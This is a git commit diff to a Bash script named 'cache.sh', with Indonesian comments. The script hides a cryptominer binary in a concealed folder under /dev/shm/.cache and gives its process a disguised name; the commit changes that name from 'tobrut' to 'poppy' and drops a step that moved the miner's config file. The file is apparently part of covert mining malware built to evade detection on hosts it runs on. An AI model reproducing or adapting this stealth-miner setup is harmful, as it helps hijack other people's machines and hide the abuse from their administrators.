0c6eb7b1f8c2af62118cdf909f45da28f5257314
ANTI VIRAL <109937537+tobrutkota@users.noreply.github.com>
2025-03-03 05:49:43 +0800

    Update cache.sh

--- cache.sh
+++ cache.sh
@@ -1,12 +1,11 @@
 #!/bin/bash
 
 # Nama proses penyamaran
-PROC_NAME="tobrut"
+PROC_NAME="poppy"
 
 # Folder tersembunyi
 MINER_DIR="/dev/shm/.cache"
 MINER_BIN="$MINER_DIR/$PROC_NAME"
-CONFIG_FILE="$MINER_DIR/config.json"
 
 # Pastikan direktori ada
 mkdir -p "$MINER_DIR"
@@ -18,14 +17,6 @@ if [ ! -f "$MINER_BIN" ]; then
     echo "Padi berhasil dipindahkan ke $MINER_BIN"
 else
     echo "Padi sudah ada di $MINER_BIN"
-fi
-
-# Pindahkan config jika belum ada
-if [ ! -f "$CONFIG_FILE" ]; then
-    mv config.json "$CONFIG_FILE"
-    echo "Config berhasil dipindahkan ke $CONFIG_FILE"
-else
-    echo "Config sudah ada di $CONFIG_FILE"
 fi
 
 exit 0
